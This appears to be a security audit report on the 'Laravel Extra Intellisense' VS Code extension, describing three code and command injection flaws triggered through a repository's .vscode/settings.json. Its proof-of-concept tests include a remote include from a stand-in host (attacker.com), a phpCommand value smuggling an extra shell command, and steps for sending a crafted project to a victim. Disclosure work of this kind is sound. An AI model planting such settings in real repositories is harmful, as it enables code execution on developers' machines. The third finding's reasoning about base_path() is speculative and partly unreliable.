## Combined Vulnerability List

### Vulnerability 1: Code Injection via `modelsPaths` Configuration
    * **Vulnerability Name:** Code Injection via `modelsPaths` Configuration
    * **Description:**
        1. Attacker creates a malicious Laravel project and includes a `.vscode/settings.json` file.
        2. In `.vscode/settings.json`, the attacker sets `LaravelExtraIntellisense.modelsPaths` to an array containing a URL pointing to a malicious PHP file hosted on an attacker-controlled server (e.g., `["//attacker.com/malicious.php"]`).
        3. The victim opens the malicious Laravel project in VS Code with the "Laravel Extra Intellisense" extension installed and activated.
        4. When the extension initializes, specifically when `EloquentProvider.loadModels()` is executed, it constructs a PHP script. This script includes an `include_once` statement that uses the paths defined in `LaravelExtraIntellisense.modelsPaths` setting.
        5. The extension executes this PHP script using the `runLaravel` helper function.
        6. The `include_once` statement in the executed PHP script attempts to include and execute the malicious PHP file from the URL specified in `LaravelExtraIntellisense.modelsPaths`.
        7. The PHP code from the attacker's server is executed on the victim's machine within the context of the VS Code extension, leading to Remote Code Execution.
    * **Impact:** Remote Code Execution (RCE). An attacker can execute arbitrary code on the victim's machine simply by the victim opening a malicious Laravel project in VS Code with the vulnerable extension installed.
    * **Vulnerability Rank:** Critical
    * **Currently Implemented Mitigations:** None. The extension directly uses the paths provided in the `modelsPaths` configuration without any validation or sanitization.
    * **Missing Mitigations:**
        - **Input Sanitization and Validation:** The extension must sanitize and validate the paths provided in the `LaravelExtraIntellisense.modelsPaths` configuration. It should ensure that the paths are valid, point to local directories within the workspace, and prevent the use of external URLs or absolute paths outside the workspace.
        - **Secure Path Handling:** Avoid using `include_once` or similar functions with user-provided paths directly without strict validation. If dynamic inclusion is necessary, implement robust path sanitization and validation to prevent Local File Inclusion and Remote File Inclusion vulnerabilities.
    * **Preconditions:**
        - The victim must have the "Laravel Extra Intellisense" extension for VS Code installed and activated.
        - The victim must open a malicious Laravel project in VS Code that is provided by the attacker.
        - The attacker must be able to create and include a `.vscode/settings.json` file in the malicious project to configure the `LaravelExtraIntellisense.modelsPaths` setting.
    * **Source Code Analysis:**
        ```typescript
        // File: ..\vscode-laravel-extra-intellisense\src\EloquentProvider.ts
        // Function: loadModels

        loadModels() {
            var self = this;
            try {
                Helpers.runLaravel(
                    "foreach (['" + vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models']).join('\', \'') + "'] as $modelPath) {" +
                    "   if (is_dir(base_path($modelPath))) {" +
                    "      foreach (scandir(base_path($modelPath)) as $sourceFile) {" +
                    "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
                    "             include_once base_path(\"$modelPath/$sourceFile\");" + // Vulnerable line: User-controlled path in include_once
                    "         }" +
                    "      }" +
                    "   }" +
                    "}" +
                    "..."
                ).then(function (result) {
                    let models = JSON.parse(result);
                    self.models = models;
                }).catch(function (e) {
                    console.error(e);
                });
            } catch (exception) {
                console.error(exception);
            }
        }
        ```
        - The code retrieves the `modelsPaths` configuration using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<Array<string>>('modelsPaths', ['app', 'app/Models'])`.
        - This configuration value, which is user-controlled through `.vscode/settings.json`, is directly embedded into a PHP code string.
        - The `include_once base_path(\"$modelPath/$sourceFile\")` line is vulnerable because `$modelPath` is directly derived from the user-provided `modelsPaths` configuration without sanitization, allowing for injection of arbitrary paths, including URLs.
        - When `runLaravel` executes this PHP code, it attempts to include and execute PHP files from the attacker-specified locations.

    * **Security Test Case:**
        1. **Attacker Setup:**
            - Set up a web server under attacker's control (e.g., `attacker.com`).
            - Create a malicious PHP file named `malicious.php` on the attacker's web server with the following content:
              ```php
              <?php
              file_put_contents(__DIR__ . '/rce_vulnerability_proof.txt', 'Successfully achieved RCE!');
              ?>
              ```
        2. **Malicious Project Creation:**
            - Create a new directory named `malicious-laravel-project`.
            - Inside `malicious-laravel-project`, create a subdirectory named `.vscode`.
            - Inside `.vscode`, create a file named `settings.json` with the following content:
              ```json
              {
                  "LaravelExtraIntellisense.modelsPaths": ["//attacker.com"]
              }
              ```
            - Zip the `malicious-laravel-project` directory into `malicious-laravel-project.zip`.
        3. **Victim Execution:**
            - Send the `malicious-laravel-project.zip` file to the victim.
            - Instruct the victim to:
                - Extract `malicious-laravel-project.zip` to a directory on their local machine.
                - Open the extracted `malicious-laravel-project` directory in VS Code.
                - Ensure the "Laravel Extra Intellisense" extension is installed and activated.
        4. **Verification:**
            - After the victim opens the project and the extension initializes, check if a file named `rce_vulnerability_proof.txt` has been created in the root directory of the `malicious-laravel-project` on the victim's machine.
            - If `rce_vulnerability_proof.txt` exists and contains the text "Successfully achieved RCE!", the vulnerability is confirmed. This indicates that the malicious PHP code from the attacker's server was successfully executed by the extension, leading to Remote Code Execution.

### Vulnerability 2: Command Injection via `phpCommand` configuration
    * **Vulnerability Name:** Command Injection via `phpCommand` configuration
    * **Description:**
        1. A threat actor can craft a malicious repository containing a `.vscode/settings.json` file.
        2. This settings file can override the `LaravelExtraIntellisense.phpCommand` configuration of the VSCode extension.
        3. The threat actor can inject arbitrary shell commands into the `phpCommand` setting. For example, they could set it to `php -r "{code}; malicious_command"`.
        4. When the victim opens the malicious repository in VSCode and the Laravel Extra Intellisense extension activates, the extension will use the attacker-controlled `phpCommand` to execute PHP code.
        5. Because the `phpCommand` now contains injected shell commands, these commands will be executed on the victim's machine in addition to the intended PHP code.
    * **Impact:** Remote Code Execution (RCE). The attacker can execute arbitrary commands on the victim's machine with the privileges of the VSCode process. This could allow the attacker to steal sensitive information, install malware, or compromise the victim's system.
    * **Vulnerability Rank:** Critical
    * **Currently Implemented Mitigations:**
        - None. The extension directly uses the user-provided `phpCommand` setting without any sanitization or validation.
    * **Missing Mitigations:**
        - **Input Sanitization and Validation:** The extension should sanitize and validate the `phpCommand` configuration to ensure it only contains expected and safe components. A strict allowlist of characters or command structures should be enforced.
        - **Safer Command Execution:** Instead of using `child_process.exec`, which executes the entire command string in a shell, the extension should use `child_process.spawn`. `spawn` allows for separating command arguments, preventing shell injection vulnerabilities.
        - **User Warning:** Display a clear warning to users about the security implications of modifying the `phpCommand` setting, emphasizing the risk of arbitrary code execution and advising them to only use trusted configurations. Ideally, recommend against modifying it at all unless absolutely necessary and they understand the risks.
    * **Preconditions:**
        - Victim must have the "Laravel Extra Intellisense" extension installed in VSCode.
        - Victim must open a malicious repository in VSCode that contains a crafted `.vscode/settings.json` file.
        - Workspace settings override user settings in VSCode, so no specific user setting is needed for exploitation if workspace settings are present.
    * **Source Code Analysis:**
        1. **File: `src/helpers.ts`**
        2. **Function: `runPhp(code: string, description: string|null = null)`**
        3. The function retrieves the `phpCommand` from VSCode configuration:
           ```typescript
           let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
           ```
        4. It then replaces the `{code}` placeholder with the provided PHP code:
           ```typescript
           let command = commandTemplate.replace("{code}", code);
           ```
        5. Finally, it executes the constructed command using `cp.exec`:
           ```typescript
           cp.exec(command, ... , function (err, stdout, stderr) { ... });
           ```
        6. **Vulnerability:** The `commandTemplate` is directly taken from user configuration (`phpCommand`). If a malicious user provides a `phpCommand` that includes shell commands, these commands will be executed by `cp.exec`. There is no input validation or sanitization on the `phpCommand` setting. The `{code}` placeholder replacement does not prevent command injection because it's still within the context of shell execution.

        ```mermaid
        graph LR
            A[VSCode Configuration System] --> B(getConfiguration('LaravelExtraIntellisense').get('phpCommand'));
            B --> C{phpCommand Value};
            C --> D{Construct Command};
            D --> E(cp.exec(command));
            E --> F[System Shell];
            F -- Executes php and injected commands --> G[Victim Machine];
        ```

    * **Security Test Case:**
        1. Create a new directory named `malicious-repo`.
        2. Inside `malicious-repo`, create a subdirectory named `.vscode`.
        3. Inside `.vscode`, create a file named `settings.json` with the following content:
           ```json
           {
               "LaravelExtraIntellisense.phpCommand": "php -r '{code}; touch /tmp/rce_vulnerability_confirmed'"
           }
           ```
        4. Open VSCode and open the `malicious-repo` directory as a workspace.
        5. Open any PHP or Blade file in the workspace (or create a new one).
        6. Trigger any autocompletion feature of the Laravel Extra Intellisense extension that executes PHP code. For example, in a PHP file, type `config('app.` and wait for config autocompletion suggestions to appear.
        7. After the autocompletion feature is triggered, check if the file `/tmp/rce_vulnerability_confirmed` exists on the victim's system.
        8. If the file exists, the command injection vulnerability is confirmed.

### Vulnerability 3: Code Injection via `require_once` and `basePathForCode` manipulation
    * **Vulnerability Name:** Code Injection via `require_once` and `basePathForCode` manipulation
    * **Description:**
        1. A threat actor can create a malicious repository and configure `LaravelExtraIntellisense.basePathForCode` to point to a directory they control, either within the workspace or an absolute path if the victim allows it.
        2. The attacker places a malicious PHP file (e.g., `malicious.php`) in the controlled directory. This file contains arbitrary PHP code to be executed.
        3. The extension uses `require_once` with paths constructed using `basePathForCode`.
        4. If the attacker sets `basePathForCode` to their controlled directory and the extension attempts to `require_once` a file based on this path, the malicious file `malicious.php` can be included.
        5. When the extension executes PHP code that triggers the inclusion of this file (e.g., during model loading or view parsing), the malicious PHP code within `malicious.php` will be executed on the victim's machine.
    * **Impact:** Remote Code Execution (RCE). The attacker can execute arbitrary PHP code within the context of the Laravel application, potentially leading to full application compromise and access to the victim's system.
    * **Vulnerability Rank:** High
    * **Currently Implemented Mitigations:**
        - None. The extension uses `basePathForCode` directly in `require_once` statements without sufficient validation to prevent path traversal or inclusion of malicious files.
    * **Missing Mitigations:**
        - Path validation for `basePathForCode` to ensure it points only within the intended project directory.
        - Preventing absolute paths in `basePathForCode` configuration.
        - Input sanitization to prevent path traversal characters in `basePathForCode`.
        - Consider using `include` instead of `require_once` and implement checks to verify the integrity and origin of included files.
    * **Preconditions:**
        - Victim must have the "Laravel Extra Intellisense" extension installed in VSCode.
        - Victim must open a malicious repository in VSCode.
        - The malicious repository must contain a `.vscode/settings.json` file to set a malicious `LaravelExtraIntellisense.basePathForCode`.
    * **Source Code Analysis:**
        1. **File: `src/helpers.ts`**
        2. **Function: `projectPath(path:string, forCode: boolean = false)`**
        3. This function constructs file paths using `basePathForCode` when `forCode` is true.
           ```typescript
           let basePathForCode = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('basePathForCode');
           if (forCode && basePathForCode && basePathForCode.length > 0) {
               ...
               return basePathForCode + path;
           }
           ```
        4. **File: `src/EloquentProvider.ts`**
        5. **Function: `loadModels()`**
        6. Inside `loadModels`, the extension iterates through configured `modelsPaths` and uses `require_once` to include PHP files:
           ```typescript
           "         if (substr($sourceFile, -4) == '.php' && is_file(base_path(\"$modelPath/$sourceFile\"))) {" +
           "             include_once base_path(\"$modelPath/$sourceFile\");" +
           "         }" +
           ```
        7. **Vulnerability:** The `base_path()` function in the dynamically generated PHP code, when resolved by Laravel, uses `Helpers.projectPath(..., true)` which is influenced by `basePathForCode`. By manipulating `basePathForCode`, an attacker can control the base path used in `require_once`, leading to inclusion of arbitrary PHP files.

        ```mermaid
        graph LR
            A[VSCode Configuration System] --> B(getConfiguration('LaravelExtraIntellisense').get('basePathForCode'));
            B --> C{basePathForCode Value};
            C --> D(Helpers.projectPath(..., true));
            D --> E{Constructed File Path};
            E --> F(require_once(filePath));
            F --> G[PHP Interpreter];
            G -- Executes malicious php code --> H[Victim Machine];
        ```

    * **Security Test Case:**
        1. Create a new directory named `malicious-repo-code-injection`.
        2. Inside `malicious-repo-code-injection`, create a subdirectory named `.vscode`.
        3. Inside `.vscode`, create a file named `settings.json` with the following content:
           ```json
           {
               "LaravelExtraIntellisense.basePathForCode": "/tmp"
           }
           ```
        4. In `/tmp`, create a file named `malicious.php` with the following content:
           ```php
           <?php
               touch('/tmp/code_injection_vulnerability_confirmed');
           ?>
           ```
        5. Open VSCode and open the `malicious-repo-code-injection` directory as a workspace.
        6. Trigger the Eloquent model autocompletion feature. This can be done by opening a PHP file and typing `Product::` to trigger static method suggestions for an Eloquent model.
        7. After triggering the autocompletion, check if the file `/tmp/code_injection_vulnerability_confirmed` exists on the victim's system.
        8. If the file exists, the code injection vulnerability is confirmed, as the extension likely attempted to load models and in the process included `/tmp/malicious.php` due to the manipulated `basePathForCode`.
